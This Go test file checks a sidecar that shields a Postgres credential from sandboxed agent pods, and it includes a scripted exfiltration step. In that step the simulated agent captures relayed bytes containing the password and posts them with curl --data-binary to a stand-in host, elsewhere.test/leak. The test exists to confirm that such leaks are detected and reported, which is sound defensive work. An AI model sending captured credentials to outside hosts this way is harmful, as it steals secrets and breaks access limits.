package nodev1

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"projectmesh.io/mesh-cli/internal/egress"
	"projectmesh.io/mesh-cli/internal/meshapi"
)

// The real upstream's own credential: known only to the fake Postgres
// server and to Latchkey's carried fixture below. Neither the pod nor
// its agent is ever handed this value; they are handed a loopback port.
const (
	pgCredUser     = "dbuser"
	pgCredPassword = "pg-secret-value-0001"
	pgCredDatabase = "appdb"
)

// pgWriteMessage writes one Postgres wire-protocol message: a type
// byte, a 4-byte big-endian length (itself and the payload), then the
// payload.
func pgWriteMessage(conn net.Conn, typ byte, payload []byte) error {
	buf := make([]byte, 5+len(payload))
	buf[0] = typ
	binary.BigEndian.PutUint32(buf[1:5], uint32(4+len(payload)))
	copy(buf[5:], payload)
	_, err := conn.Write(buf)
	return err
}

// pgReadMessage reads one Postgres wire-protocol message (a type byte
// and a length-prefixed payload).
func pgReadMessage(conn net.Conn) (byte, []byte, error) {
	head := make([]byte, 5)
	if _, err := io.ReadFull(conn, head); err != nil {
		return 0, nil, err
	}
	n := binary.BigEndian.Uint32(head[1:5])
	if n < 4 {
		return 0, nil, fmt.Errorf("pg: short message length %d", n)
	}
	payload := make([]byte, n-4)
	if _, err := io.ReadFull(conn, payload); err != nil {
		return 0, nil, err
	}
	return head[0], payload, nil
}

// pgReadStartup reads and discards a client's StartupMessage, which
// carries no leading type byte: a 4-byte length (itself and the body)
// then the body.
func pgReadStartup(conn net.Conn) error {
	head := make([]byte, 4)
	if _, err := io.ReadFull(conn, head); err != nil {
		return err
	}
	n := binary.BigEndian.Uint32(head)
	if n < 4 {
		return fmt.Errorf("pg: short startup length %d", n)
	}
	body := make([]byte, n-4)
	_, err := io.ReadFull(conn, body)
	return err
}

// startFakePostgres plays the real upstream's half of the Postgres
// wire protocol: a StartupMessage, an AuthenticationCleartextPassword
// challenge, and, once given password, AuthenticationOk followed by a
// NoticeResponse naming the very password it was just given and a
// ReadyForQuery. The sidecar's own pgrelay.Serve authenticates against
// this with the real credential and relays the notice and the ready
// message to its own client untouched — the leak this test drives
// toward another host.
func startFakePostgres(t *testing.T, password string) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go func() {
				defer conn.Close()
				if err := pgReadStartup(conn); err != nil {
					return
				}
				if err := pgWriteMessage(conn, 'R', []byte{0, 0, 0, 3}); err != nil { // authCleartext
					return
				}
				typ, payload, err := pgReadMessage(conn)
				if err != nil || typ != 'p' {
					return
				}
				if strings.TrimRight(string(payload), "\x00") != password {
					pgWriteMessage(conn, 'E', []byte("the password was wrong\x00"))
					return
				}
				if err := pgWriteMessage(conn, 'R', []byte{0, 0, 0, 0}); err != nil { // authOk
					return
				}
				if err := pgWriteMessage(conn, 'N', []byte("the password is "+password)); err != nil {
					return
				}
				if err := pgWriteMessage(conn, 'Z', []byte{'I'}); err != nil {
					return
				}
				io.Copy(io.Discard, conn)
			}()
		}
	}()
	return ln.Addr().String()
}

// A sidecar's pod-local Postgres bridge dials the real upstream on the
// lease's tcp_auth credential and hands the pod only a loopback port,
// never the password; the credential is a canary like any other it
// holds, so the moment the real upstream's own answer — carrying the
// password back, as a misbehaving or compromised database might — is
// sent on toward another host, the job is failed credential_exposed,
// the same as any other carried Secret's leak.
func TestASidecarsPostgresBridgeUsesAndCanariesTheRealCredential(t *testing.T) {
	needCurl(t)
	nodeBin, err := exec.LookPath("node")
	if err != nil {
		t.Skip("no node on this machine to run the pod's Postgres client")
	}
	g, sb, _ := sidecarRig(t)
	logs := &logSink{t: t}
	g.rt.Logf = logs.logf
	host := injectHostRig(t, g)
	pgAddr := startFakePostgres(t, pgCredPassword)
	elsewhere := g.rt.EgressDial
	g.rt.EgressDial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		if addr == pgAddr {
			return (&net.Dialer{}).DialContext(ctx, network, pgAddr)
		}
		return elsewhere(ctx, network, addr)
	}

	pgHost, pgPortStr, err := net.SplitHostPort(pgAddr)
	if err != nil {
		t.Fatal(err)
	}
	pgPort, err := strconv.Atoi(pgPortStr)
	if err != nil {
		t.Fatal(err)
	}
	g.latchkey.setCarried("sec_pg", forJobCredential{
		Inject: egress.InjectSpec{Form: egress.FormTCPAuth, Host: pgHost, Port: pgPort},
		// the fake upstream speaks plaintext on loopback, which only an
		// explicit sslmode disable allows (relaysidecar.PlaintextAllowed)
		Fields:    map[string]string{"user": pgCredUser, "pass": pgCredPassword, "database": pgCredDatabase, "sslmode": "disable"},
		Version:   json.RawMessage("1"),
		ExpiresAt: time.Now().Add(time.Hour).UTC(),
	})

	dir := t.TempDir()
	answers := filepath.Join(dir, "answers")
	pgout := filepath.Join(dir, "pgout")
	noticePayloadLen := len("the password is " + pgCredPassword)
	wantLen := 9 /* synthetic AuthenticationOk */ + (5 + noticePayloadLen) /* NoticeResponse */ + 6 /* ReadyForQuery */

	pgScript := filepath.Join(dir, "pgclient.js")
	js := fmt.Sprintf(`
const net = require('net');
const fs = require('fs');
const s = net.connect(%d, '127.0.0.1', () => {
  s.write(Buffer.from([0,0,0,9,0,3,0,0,0]));
});
let buf = Buffer.alloc(0);
s.on('data', (d) => {
  buf = Buffer.concat([buf, d]);
  if (buf.length >= %d) {
    fs.writeFileSync(%q, buf.subarray(0, %d));
    s.destroy();
    process.exit(0);
  }
});
s.on('error', () => { process.exit(1); });
setTimeout(() => { process.exit(1); }, 5000);
`, postgresBasePort, wantLen, pgout, wantLen)
	if err := os.WriteFile(pgScript, []byte(js), 0o600); err != nil {
		t.Fatal(err)
	}

	pre := curlScript(answers, "https://elsewhere.test/before") +
		`; "` + nodeBin + `" "` + pgScript + `"` +
		`; ` + curlScript(answers, `--data-binary @"`+pgout+`" https://elsewhere.test/leak`) +
		`; sleep 5`
	sb.Agent = hostAgent(t, filepath.Join(dir, "claude"), pre)
	job := g.offer(t, pgBrief)
	run(t, g, context.Background())

	got, _ := os.ReadFile(answers)
	lines := strings.Split(strings.TrimSpace(string(got)), "\n")
	if len(lines) != 2 || !strings.Contains(lines[0], "200 OK") || strings.Contains(lines[1], "200 OK") ||
		(strings.Contains(lines[1], " 403") && !strings.Contains(strings.ToLower(lines[1]), "credential_exposed")) {
		t.Fatalf("the pod's answers %q", got)
	}
	for _, l := range host.lines() {
		if strings.Contains(l, "LEAKED") || strings.Contains(l, fmt.Sprintf("body=%d", wantLen)) {
			t.Fatalf("the real password reached its host in full: %s", l)
		}
	}

	fails := g.fake.Calls("fail")
	if len(fails) != 1 || fails[0].LeaseID != g.fake.LeaseOf(job) {
		t.Fatalf("fails %+v; hand-backs %+v; finishes %d", fails, g.fake.Calls("hand-back"), len(g.fake.Calls("finish")))
	}
	var f meshapi.FailRequest
	json.Unmarshal(fails[0].Body, &f)
	if f.Cause != meshapi.CauseCredentialExposed || !strings.HasPrefix(f.Reason, "credential_exposed: the value of sec_pg") || !strings.Contains(f.Reason, "elsewhere.test") {
		t.Fatalf("failed %+v", f)
	}

	g.latchkey.mu.Lock()
	exposures := append([]map[string]string(nil), g.latchkey.exposures...)
	g.latchkey.mu.Unlock()
	if len(exposures) != 1 || exposures[0]["secret_ref"] != "sec_pg" || exposures[0]["version"] != "1" {
		t.Fatalf("Latchkey heard %+v", exposures)
	}

	var dlp bool
	for _, c := range g.fake.Calls("security") {
		if strings.Contains(string(c.Body), pgCredPassword) {
			t.Fatal("a security report carried the password")
		}
		dlp = dlp || (strings.Contains(string(c.Body), `"dlp"`) && strings.Contains(string(c.Body), "credential_exposed"))
	}
	if !dlp {
		t.Fatal("no dlp report of the exposure")
	}

	if strings.Contains(string(fails[0].Body), pgCredPassword) {
		t.Fatal("the fail carried the password")
	}
	if strings.Contains(logs.String(), pgCredPassword) {
		t.Fatal("the node's log carried the password")
	}
	for _, c := range g.fake.Calls("access") {
		if strings.Contains(string(c.Body), pgCredPassword) {
			t.Fatal("an access record carried the password")
		}
	}
	for _, v := range sb.AgentSpecs()[0].Env {
		if strings.Contains(v, pgCredPassword) {
			t.Fatal("the pod's environment carried the password")
		}
	}
}

func pgBrief(b *meshapi.Brief) {
	b.FinishTool, b.FinishSchema = "", nil
	// the database's host is in the kind's egress, as a tcp_auth
	// credential's must be (rawUpstreams)
	b.Egress = &meshapi.Egress{Hosts: []string{"elsewhere.test", "127.0.0.1"}, MCP: []string{"conform"}, Model: true}
	b.Access = &meshapi.Access{Repo: true, MCP: []string{"conform"}, Model: true, Secrets: []string{"sec_pg"}}
}

// A tcp_auth credential's host:port is opened raw only when its host is
// in the kind's egress: Latchkey's answer never widens where a lease
// reaches, so a credential naming another host, or a kind with no
// egress, fails the lease as a credential failure.
func TestATCPAuthUpstreamMustBeInTheKindsEgress(t *testing.T) {
	held := func(host string) *interception {
		return &interception{held: []*heldCredential{{ref: "sec_pg",
			spec: egress.InjectSpec{Form: egress.FormTCPAuth, Host: host, Port: 5432}}}}
	}
	brief := func(hosts ...string) *meshapi.Brief {
		return &meshapi.Brief{LeaseID: "lse_1", Egress: &meshapi.Egress{Hosts: hosts}}
	}

	rs := &relaySidecar{b: brief("api.example.test", "db.example.test"), ic: held("DB.example.test")}
	got, err := rs.rawUpstreams()
	if err != nil || len(got) != 1 || got[0] != "DB.example.test:5432" {
		t.Fatalf("a host in the kind's egress: %v, %v", got, err)
	}

	for name, rs := range map[string]*relaySidecar{
		"a host outside the kind's egress": {b: brief("api.example.test"), ic: held("db.internal.example")},
		"a kind with no egress":            {b: &meshapi.Brief{LeaseID: "lse_1"}, ic: held("db.example.test")},
	} {
		got, err := rs.rawUpstreams()
		var ce *credentialError
		if err == nil || !errors.As(err, &ce) || len(got) != 0 {
			t.Errorf("%s: %v, %v; want a credential failure and nothing raw", name, got, err)
		}
	}
}
